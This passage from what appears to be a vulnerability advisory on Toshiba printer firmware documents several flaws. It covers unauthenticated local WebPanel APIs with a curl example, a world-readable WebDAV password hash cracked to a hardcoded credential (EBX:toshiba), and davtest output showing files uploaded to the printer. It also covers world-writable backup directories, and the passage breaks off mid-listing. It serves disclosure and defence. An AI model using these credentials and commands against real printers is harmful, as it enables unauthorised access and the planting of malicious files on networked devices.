<p>For example, to reach the SettingApp, it is possible to send HTTP request to <code>/aplpx/</code>:</p>
<p>Content of <code>/encryption/al/network/config/httpd.conf</code>:</p>
<pre><code>[...]
1146 ProxyPass /aplpx/ http://localhost:50184/
1147 ProxyPassReverse /aplpx/ http://localhost:50184/
[...]
</code></pre>
<p>A remote attacker can bypass authentication in remote applications.</p>
<p><a id="lpe-webpanel"></a></p>
<h2>Details - Lack of authentication in WebPanel - Local Privilege Escalation</h2>
<p>It was observed that all the Toshiba printers use Python programs running as WSGI applications to provide dynamic web APIs. These APIs provide, for example, remote administration to the printers.</p>
<p>One of these applications is the WebPanel, binding to the localhost interface on port 50180/tcp. This program provides API without authentication. A local attacker can change the configuration of the printer without authentication by reaching these routes located inside <code>/devicecontrol</code>:</p>
<p>Content of <code>/registration/al/WebPanel/wpserver/screenfacade/devicecontrol/__init__.py</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  <span style="color: #666666">1</span> <span style="color: #408080; font-style: italic">#! /usr/bin/env python</span>
  <span style="color: #666666">2</span> <span style="color: #408080; font-style: italic"># -*- coding: utf-8 -*-</span>
  <span style="color: #666666">3</span> <span style="color: #008000; font-weight: bold">import</span> <span style="color: #0000FF; font-weight: bold">logging</span>
  <span style="color: #666666">4</span>
  <span style="color: #666666">5</span> <span style="color: #008000; font-weight: bold">from</span> <span style="color: #0000FF; font-weight: bold">pyramid.config</span> <span style="color: #008000; font-weight: bold">import</span> Configurator
  <span style="color: #666666">6</span>
  <span style="color: #666666">7</span> log <span style="color: #666666">=</span> logging<span style="color: #666666">.</span>getLogger(<span style="color: #BA2121">&quot;wpserver&quot;</span>)
  <span style="color: #666666">8</span>
  <span style="color: #666666">9</span>
 <span style="color: #666666">10</span> <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">includeme</span>(config):
 <span style="color: #666666">11</span>     log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&quot;includeme:ENTER&quot;</span>)
 <span style="color: #666666">12</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;init_powercontrol&#39;</span>, <span style="color: #BA2121">&#39;initPowerControl&#39;</span>)
 <span style="color: #666666">13</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;powercontrol_mode&#39;</span>, <span style="color: #BA2121">&#39;PowercontrolMode&#39;</span>)
 <span style="color: #666666">14</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;turn_on_led&#39;</span>, <span style="color: #BA2121">&#39;turnOnLED&#39;</span>)
 <span style="color: #666666">15</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;turn_off_led&#39;</span>, <span style="color: #BA2121">&#39;turnOffLED&#39;</span>)
 <span style="color: #666666">16</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;invoke_screen&#39;</span>, <span style="color: #BA2121">&#39;invokeScreen&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">True</span>)
 <span style="color: #666666">17</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;invoke_popup_window&#39;</span>, <span style="color: #BA2121">&#39;invokePopupWindow&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">True</span>)
 <span style="color: #666666">18</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;invoke_auth_popup_window&#39;</span>, <span style="color: #BA2121">&#39;invokeAuthPopupWindow&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">True</span>)
 <span style="color: #666666">19</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;invoke_auth_popupwindowwith_permissions&#39;</span>, <span style="color: #BA2121">&#39;invokeAuthPopupWindowWithPermissions&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">True</span>)
 <span style="color: #666666">20</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;start_rotatepolygon&#39;</span>, <span style="color: #BA2121">&#39;startRotatePolygon&#39;</span>)
 <span style="color: #666666">21</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;start_fuserheating&#39;</span>, <span style="color: #BA2121">&#39;startFuserHeating&#39;</span>)
 <span style="color: #666666">22</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;start_fuserheating_rotatepolygon&#39;</span>, <span style="color: #BA2121">&#39;startFuserHeatingRotatePolygon&#39;</span>)
 <span style="color: #666666">23</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;invoke_popup_screen&#39;</span>, <span style="color: #BA2121">&#39;invokePopupScreen&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">True</span>)
 <span style="color: #666666">24</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;invoke_drawer_window&#39;</span>, <span style="color: #BA2121">&#39;invokeDrawerWindow&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">True</span>)
 <span style="color: #666666">25</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;blink_led&#39;</span>, <span style="color: #BA2121">&#39;blinkLED&#39;</span>)
 <span style="color: #666666">26</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;get_device_running_status&#39;</span>, <span style="color: #BA2121">&#39;getDeviceRunningStatus&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">True</span>)
 <span style="color: #666666">27</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;get_drawer_information&#39;</span>, <span style="color: #BA2121">&#39;getDrawerInformation&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">True</span>)
 <span style="color: #666666">28</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;lock_keys_withid&#39;</span>, <span style="color: #BA2121">&#39;lockKeysWithID&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">True</span>)
 <span style="color: #666666">29</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;unlock_keys_withid&#39;</span>, <span style="color: #BA2121">&#39;unLockKeysWithID&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">True</span>)
 <span style="color: #666666">30</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;show_sharedhome_window&#39;</span>, <span style="color: #BA2121">&#39;showSharedHomeWindow&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">True</span>)
 <span style="color: #666666">31</span>     log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&quot;includeme:EXIT&quot;</span>)
 <span style="color: #666666">32</span>
 <span style="color: #666666">33</span>
 <span style="color: #666666">34</span> <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">main</span>(global_config, <span style="color: #666666">**</span>settings):
 <span style="color: #666666">35</span>     <span style="color: #BA2121">&quot;&quot;&quot; This function returns a Pyramid WSGI application.</span>
<span style="color: #BA2121"> 36     &quot;&quot;&quot;</span>
 <span style="color: #666666">37</span>     log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&quot;main:ENTER&quot;</span>)
 <span style="color: #666666">38</span>     config <span style="color: #666666">=</span> Configurator(settings<span style="color: #666666">=</span>settings)
 <span style="color: #666666">39</span>     config<span style="color: #666666">.</span>include(includeme, route_prefix<span style="color: #666666">=</span><span style="color: #BA2121">&#39;/devicecontrol&#39;</span>)
 <span style="color: #666666">40</span>     config<span style="color: #666666">.</span>add_static_view(<span style="color: #BA2121">&#39;static&#39;</span>, <span style="color: #BA2121">&#39;prototype&#39;</span>, cache_max_age<span style="color: #666666">=3600</span>)
 <span style="color: #666666">41</span>     config<span style="color: #666666">.</span>scan(<span style="color: #BA2121">&#39;devicecontrol&#39;</span>)
 <span style="color: #666666">42</span>     log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&quot;main:EXIT&quot;</span>)
 <span style="color: #666666">43</span>     <span style="color: #008000; font-weight: bold">return</span> config<span style="color: #666666">.</span>make_wsgi_app()
</pre></div>

<p>246 routes are defined in Python scripts inside the WebPanel, listening on port 50180, without authentication:</p>
<p>API access without authentication:</p>
<pre><code>./wpserver/eventmanagement/__init__.py:    config.add_route('sse_event_start', 'sseEventStart')
./wpserver/eventmanagement/__init__.py:    config.add_route('sse_event_stop', 'sseEventStop')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('user_login_required', 'userLoginRequired', xhr=True)
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('authenticate_user', 'authenticateUser', xhr=True)
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('async_Authenticate_Check', 'asyncAuthenticateCheck', xhr=True)
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('change_user_password', 'changePassword', xhr=True)
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('user_log_out', 'userLogOut', xhr=True)
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('set_dept_code', 'setDeptCode')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('get_diagnostic_code', 'getDiagnosticCode')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('register_user', 'registerUser')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('login_by_pincode', 'loginByPinCode')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('login_by_pincode_external', 'loginByPinCodeExternal')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('login_by_cardid', 'loginByCardId')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('login_by_cardid_external', 'loginByCardIdExternal')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('login_by_card_pincode', 'loginByCardIdAndPinCode')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('login_by_card_pin_external', 'loginByCardIdAndPinExternal')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('project_management_setting', 'projectManagementSetting')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('project_management_operations', 'projectOperations')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('card_swipe_event_subscribe', 'CardSwipeEventSubscribe')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('card_swipe_event_unsubscribe', 'CardSwipeEventUnsubscribe')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('job_status_blink_event_subscribe', 'JobStatusBlinkEventSubscribe')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('job_status_blink_event_unsubscribe', 'JobStatusBlinkEventUnsubscribe')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('set_pin_code', 'setPinCode')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('set_swipe_event', 'setSwipeEvent')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('set_remote_scan', 'setRemoteScan')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('validate_credential', 'validateCredential')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('authenticate_by_smtp_ldap', 'authenticateBySmtporLdap')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('validate_temp_login_admin', 'validateTempLoginAdmin', xhr=True)
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('get_display_settings', 'getDisplaySettings', xhr=True)
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('after_login_success_checks', 'afterLoginSuccessChecks', xhr=True)
./wpserver/screenfacade/basepanel/__init__.py:    config.add_route('set_inactive_mode', 'setInactiveMode', xhr=True)
./wpserver/screenfacade/basepanel/__init__.py:    config.add_route('set_active_mode', 'setActiveMode', xhr=True)
./wpserver/screenfacade/basepanel/__init__.py:    config.add_route('init_department_code', 'initDepartmentCode', xhr=True)
./wpserver/screenfacade/basepanel/__init__.py:    config.add_route('get_current_language', 'getCurrentLanguage', xhr=True)
./wpserver/screenfacade/basepanel/__init__.py:    config.add_route('update_paramters_for_coincontroller', 'updateCoinControllerParameters', xhr=True)
./wpserver/screenfacade/basepanel/__init__.py:    config.add_route('pause_auto_clear_timer', 'pauseAutoClearTimer', xhr=True)
./wpserver/screenfacade/basepanel/__init__.py:    config.add_route('resume_auto_clear_timer', 'resumeAutoClearTimer', xhr=True)
./wpserver/screenfacade/basepanel/__init__.py:    config.add_route('control_power_key', 'controlPowerKey', xhr=True)
./wpserver/screenfacade/jobstatus/__init__.py:  config.add_route('init_jobstatus', 'initJobstatus', xhr=True)
./wpserver/screenfacade/jobstatus/__init__.py:  config.add_route('get_log_auth','getLogAuthentication')
./wpserver/screenfacade/jobstatus/__init__.py:  config.add_route('get_suspended_job_details', 'getSuspendedJobDetails', xhr=True)
./wpserver/screenfacade/jobstatus/__init__.py:  config.add_route('re_init_jobstatus', 'reInitJobstatus', xhr=True)
./wpserver/screenfacade/jobstatus/__init__.py:  config.add_route('get_sync_mode','getSyncMode')
./wpserver/screenfacade/jobstatus/__init__.py:  config.add_route('init_jobstatus_jobs', 'initJobStatusJobs', xhr=True)
./wpserver/screenfacade/jobstatus/__init__.py:  config.add_route('get_count_wfid', 'getTotalJobs', xhr=True)
./wpserver/screenfacade/jobstatus/__init__.py:  config.add_route('get_print_job', 'getPrintJobList', xhr=True)
./wpserver/screenfacade/jobstatus/__init__.py:  config.add_route('update_print_parameter','updateSuspendedJobData')
./wpserver/screenfacade/jobstatus/__init__.py:  config.add_route('jobs_start_hard_key','jobsStartHardKey')
./wpserver/screenfacade/jobstatus/__init__.py:  config.add_route('get_scan_job', 'getScanJobList', xhr=True)
./wpserver/screenfacade/jobstatus/__init__.py:  config.add_route('init_fax_jobs', 'initFaxJobs', xhr=True)
./wpserver/screenfacade/jobstatus/__init__.py:  config.add_route('get_fax_job', 'getFaxJobList', xhr=True)
./wpserver/screenfacade/jobstatus/__init__.py:  config.add_route('init_jobstatus_logs', 'initJobStatusLogs', xhr=True)
[...]
</code></pre>
<p>These routes are used for internal communications from localhost without authentication.</p>
<p>Content of <code>/work/log/al/httpd_wsgi_access.log</code>:</p>
<pre><code>127.0.0.1 - - [25/Apr/2023:13:17:38 +0530] "GET /wpserver/devicecontrol/turnOffLED?key=FunctionClear HTTP/1.1" 200 2
127.0.0.1 - - [25/Apr/2023:13:18:26 +0530] "GET /wpserver/home/getLoginData?_=1682332768396 HTTP/1.1" 200 1289
127.0.0.1 - - [25/Apr/2023:13:18:26 +0530] "GET /wpserver/statusbar/statusBarEventUnsubscribe?_=1682332768397 HTTP/1.1" 200 2
127.0.0.1 - - [25/Apr/2023:13:18:26 +0530] "GET /wpserver/statusbar/statusBarEventSubscribe?_=1682332768398 HTTP/1.1" 200 2
127.0.0.1 - - [25/Apr/2023:13:18:27 +0530] "GET /wpserver/home/initHomeScreen?defaultMenu=undefined&amp;_=1682332768399 HTTP/1.1" 200 9648
127.0.0.1 - - [25/Apr/2023:13:18:27 +0530] "GET /wpserver/home/getRemainingTiles?userType=Public&amp;selectedTileSize=large&amp;_=1682332768400 HTTP/1.1" 200 16
127.0.0.1 - - [25/Apr/2023:13:18:27 +0530] "GET /wpserver/devicecontrol/turnOnLED?key=Start HTTP/1.1" 200 2
127.0.0.1 - - [25/Apr/2023:13:18:27 +0530] "GET /wpserver/devicecontrol/turnOffLED?key=FunctionClear HTTP/1.1" 200 2
127.0.0.1 - - [25/Apr/2023:13:19:12 +0530] "GET /wpserver/devicecontrol/invokeScreen?screen=JobStatus&amp;_=1682332768401 HTTP/1.1" 200 2
127.0.0.1 - - [25/Apr/2023:13:20:01 +0530] "GET /wpserver/home/getLoginData?_=1682332768402 HTTP/1.1" 200 1444
127.0.0.1 - - [25/Apr/2023:13:20:02 +0530] "GET /wpserver/statusbar/statusBarEventUnsubscribe?_=1682332768403 HTTP/1.1" 200 2
127.0.0.1 - - [25/Apr/2023:13:20:02 +0530] "GET /wpserver/statusbar/statusBarEventSubscribe?_=1682332768404 HTTP/1.1" 200 2
127.0.0.1 - - [25/Apr/2023:13:20:02 +0530] "GET /wpserver/home/initHomeScreen?defaultMenu=undefined&amp;_=1682332768405 HTTP/1.1" 200 9648
127.0.0.1 - - [25/Apr/2023:13:20:03 +0530] "GET /wpserver/home/getRemainingTiles?userType=Public&amp;selectedTileSize=large&amp;_=1682332768406 HTTP/1.1" 200 16
127.0.0.1 - - [25/Apr/2023:13:20:03 +0530] "GET /wpserver/devicecontrol/turnOnLED?key=Start HTTP/1.1" 200 2
127.0.0.1 - - [25/Apr/2023:13:20:03 +0530] "GET /wpserver/devicecontrol/turnOffLED?key=FunctionClear HTTP/1.1" 200 2
127.0.0.1 - - [25/Apr/2023:13:52:03 +0530] "GET /wpserver/devicecontrol/invokeScreen?screen=JobStatus&amp;_=1682332768407 HTTP/1.1" 200 2
127.0.0.1 - - [25/Apr/2023:13:52:30 +0530] "GET /wpserver/print/initPrintJob?_=1682332768408 HTTP/1.1" 200 1398
127.0.0.1 - - [25/Apr/2023:13:52:30 +0530] "GET /wpserver/devicecontrol/turnOffLED?key=Start HTTP/1.1" 200 2
</code></pre>
<p>For example, a local attacker can reach these APIs without authentication:</p>
<pre><code>bash-4.1# curl "http://127.0.0.1:50180/wpserver/devicecontrol/turnOffLED?key=FunctionClear"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100     2  100     2    0     0      2      0  0:00:01 --:--:--  0:00:01   166
OK
</code></pre>
<p>A local attacker can bypass authentication in applications, providing administrative access.</p>
<p><a id="hardcoded-credentials-webdav"></a></p>
<h2>Details - Hardcoded credentials for WebDAV access</h2>
<p>It was observed that all the Toshiba printers contain credentials used for WebDAV access in the world-readable file <code>/home/SYSROM_SRC/data/passwords</code>:</p>
<pre><code>bash-4.1# ls -la /home/SYSROM_SRC/data/passwords
-rw-rw-rw- 1 root trusted 42 Jan 18  2022 /home/SYSROM_SRC/data/passwords
bash-4.1# cat /home/SYSROM_SRC/data/passwords
EBX:$apr1$wQYd9W5O$wDKvnN4Ij34hwvTiohAka.
</code></pre>
<p>It is possible to crack this hash with John:</p>
<pre>
kali% john passwd.toshiba
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 8 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
<font color=red>toshiba          (EBX)     </font>
1g 0:00:00:00 DONE 2/3 (2023-03-09 09:22) 11.11g/s 36022p/s 36022c/s 36022C/s keller..karla
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
kali%
</pre>

<p>Then, for firmware versions released by 2020, it is possible to get a full access with WebDAV to the printer.</p>
<p>Such access was successfully done against printers running the firmware versions T373HD0W1054, T410HD0W1073, TB01HD0W1610 and TG01HD0W1610:</p>
<pre><code>kali% davtest -url http://10.0.0.1:8080/storage/box/ITUTBoxes
********************************************************
 Testing DAV connection
OPEN            FAIL:   http://10.0.0.1:8080/storage/box/ITUTBoxes  Server response: 405 Method Not Allowed
kali% davtest -url http://EBX:toshiba@10.0.0.1:8080/storage/box/ITUTBoxes
********************************************************
 Testing DAV connection
OPEN            FAIL:   http://EBX:toshiba@10.0.0.1:8080/storage/box/ITUTBoxes      Server response: 405 Method Not Allowed
kali% davtest -url http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/    
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes
********************************************************
NOTE    Random string for this session: SIX4x_ZkORvv
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv
********************************************************
 Sending test files
PUT     aspx    SUCCEED:        http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.aspx
PUT     asp     SUCCEED:        http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.asp
PUT     jhtml   SUCCEED:        http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.jhtml
PUT     txt     SUCCEED:        http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.txt
PUT     cfm     SUCCEED:        http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.cfm
PUT     pl      SUCCEED:        http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.pl
PUT     shtml   SUCCEED:        http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.shtml
PUT     php     SUCCEED:        http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.php
PUT     jsp     SUCCEED:        http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.jsp
PUT     cgi     SUCCEED:        http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.cgi
PUT     html    SUCCEED:        http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.html
********************************************************
 Checking for test file execution
EXEC    aspx    FAIL
EXEC    asp     FAIL
EXEC    jhtml   FAIL
EXEC    txt     SUCCEED:        http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.txt
EXEC    txt     FAIL
EXEC    cfm     FAIL
EXEC    pl      FAIL
EXEC    shtml   FAIL
EXEC    php     FAIL
EXEC    jsp     FAIL
EXEC    cgi     FAIL
EXEC    html    SUCCEED:        http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.html
EXEC    html    FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv
PUT File: http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.aspx
PUT File: http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.asp
PUT File: http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.jhtml
PUT File: http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.txt
PUT File: http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.cfm
PUT File: http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.pl
PUT File: http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.shtml
PUT File: http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.php
PUT File: http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.jsp
PUT File: http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.cgi
PUT File: http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.html
Executes: http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.txt
Executes: http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.html
kali%
</code></pre>
<p>We can confirm the files are stored inside the printer:     </p>
<pre><code>bash-4.1# ls -la /storage/box/EFilingBoxes/
total 16
drwxrwxrwx 4 root   root    4096 Mar  9 03:22 .
drwxr-xr-x 9 root   root    4096 Mar  9 01:47 ..
drwxrwxrwx 2 root   trusted 4096 Aug 12  2018 00000
drwxrwxrwx 2 apache trusted 4096 Mar  9 03:22 DavTestDir_SIX4x_ZkORvv
-rwxrwxrwx 1 root   trusted    0 Mar  9 01:47 initialized.sts
bash-4.1# ls -la /storage/box/EFilingBoxes/DavTestDir_SIX4x_ZkORvv
total 52
drwxrwxrwx 2 apache trusted 4096 Mar  9 03:22 .
drwxrwxrwx 4 root   root    4096 Mar  9 03:22 ..
-rw-rw-rw- 1 apache trusted   44 Mar  9 03:22 davtest_SIX4x_ZkORvv.asp
-rw-rw-rw- 1 apache trusted   44 Mar  9 03:22 davtest_SIX4x_ZkORvv.aspx
-rw-rw-rw- 1 apache trusted   42 Mar  9 03:22 davtest_SIX4x_ZkORvv.cfm
-rw-rw-rw- 1 apache trusted   66 Mar  9 03:22 davtest_SIX4x_ZkORvv.cgi
-rw-rw-rw- 1 apache trusted   26 Mar  9 03:22 davtest_SIX4x_ZkORvv.html
-rw-rw-rw- 1 apache trusted   37 Mar  9 03:22 davtest_SIX4x_ZkORvv.jhtml
-rw-rw-rw- 1 apache trusted   37 Mar  9 03:22 davtest_SIX4x_ZkORvv.jsp
-rw-rw-rw- 1 apache trusted   24 Mar  9 03:22 davtest_SIX4x_ZkORvv.php
-rw-rw-rw- 1 apache trusted   66 Mar  9 03:22 davtest_SIX4x_ZkORvv.pl
-rw-rw-rw- 1 apache trusted  181 Mar  9 03:22 davtest_SIX4x_ZkORvv.shtml
-rw-rw-rw- 1 apache trusted   19 Mar  9 03:22 davtest_SIX4x_ZkORvv.txt
bash-4.1#
</code></pre>
<p>A remote attacker can store files that will contain XSS in the printer web interface.</p>
<p>This vulnerability has been patched in the latest firmware version since the new version of Apache has some changes in the configuration options (the <code>require valid-user</code> option).</p>
<h2>Target: Toshiba Printers - Embedded applications</h2>
<h2>Summary</h2>
<p>The Toshiba printers support additional programs ("embedded applications") in the latest version of the firmware images.</p>
<p>By default, 2 programs are installed:</p>
<ul>
<li>Remote Command (v1.0.8)</li>
<li>Cloud Authentication for email (v1.0.0).</li>
</ul>
<p>Listing of applications installed by default:</p>
<p><img alt="" src="images/2024-toshiba-application-list.png" /></p>
<p><a href="images/2024-toshiba-application-list-full.png">Click here for full image</a></p>
<p>It is possible to interact with such applications as shown below:</p>
<p><img alt="" src="images/2024-toshiba-application-remote-cmd.png" /></p>
<p><a href="images/2024-toshiba-application-remote-cmd-full.png">Click here for full image</a></p>
<p><a id="insecure-permissions"></a></p>
<h2>Details - Insecure permissions</h2>
<p>It was observed that the programs are located inside the /application directory:</p>
<p>Content of <code>/application</code>:</p>
<pre><code>bash-4.1# cd /application
bash-4.1# ls -la
total 44
drwxr-xr-x  8 root root     4096 Mar 15 11:49 .
drwxr-xr-x 30 root root     4096 Apr 10 18:47 ..
drwxr-xr-x  4 root root     4096 Mar 15 11:50 app
drwxrwxrwx  4 root trusted  4096 Mar 15 11:49 backup
drwx--x---  3 root trusted  4096 Apr  6  2016 common
drwxr-xr-x  5 root root     4096 Apr  6  2016 framework
drwx------  2 root root    16384 Apr  6  2016 lost+found
drwxr-xr-x  7 root root     4096 Apr  6  2016 webframework
bash-4.1#
</code></pre>
<p>When analyzing the directories inside /application, we can find several insecure permissions.</p>
<p>The backup directory is insecure, with incorrect (777) permissions everywhere:</p>
<p>Content of <code>/application/backup</code>:</p>
<pre><code>bash-4.1# pwd
/application/backup 
bash-4.1#  
bash-4.1# ls -la
total 16
drwxrwxrwx 4 root trusted 4096 Mar 15 11:49 .
drwxr-xr-x 8 root root    4096 Mar 15 11:49 ..
drwxrwxrwx 4 root trusted 4096 Mar 15 11:50 initial
drwxrwxrwx 4 root trusted 4096 Mar 15 11:50 latest
bash-4.1# ls -latrR 
.:
total 16
drwxr-xr-x 8 root root    4096 Mar 15 11:49 ..
drwxrwxrwx 4 root trusted 4096 Mar 15 11:49 .
drwxrwxrwx 4 root trusted 4096 Mar 15 11:50 initial
drwxrwxrwx 4 root trusted 4096 Mar 15 11:50 latest

./initial:
total 16
drwxrwxrwx 2 apache trusted 4096 Mar 15 11:49 10000000-0000-0000-0000-500000000000
drwxrwxrwx 4 root   trusted 4096 Mar 15 11:49 ..
drwxrwxrwx 2 apache trusted 4096 Mar 15 11:50 10000000-0000-0000-0000-500000000001
drwxrwxrwx 4 root   trusted 4096 Mar 15 11:50 .

./initial/10000000-0000-0000-0000-500000000000:
total 184
drwxrwxrwx 2 apache trusted   4096 Mar 15 11:49 .
-rwxrwxrwx 1 apache trusted 176778 Mar 15 11:49 apppackage.zip
drwxrwxrwx 4 root   trusted   4096 Mar 15 11:50 ..

./initial/10000000-0000-0000-0000-500000000001:
total 256
drwxrwxrwx 4 root   trusted   4096 Mar 15 11:50 ..
drwxrwxrwx 2 apache trusted   4096 Mar 15 11:50 .
-rwxrwxrwx 1 apache trusted 250054 Mar 15 11:50 apppackage.zip

./latest:
total 16
drwxrwxrwx 4 root   trusted 4096 Mar 15 11:49 ..
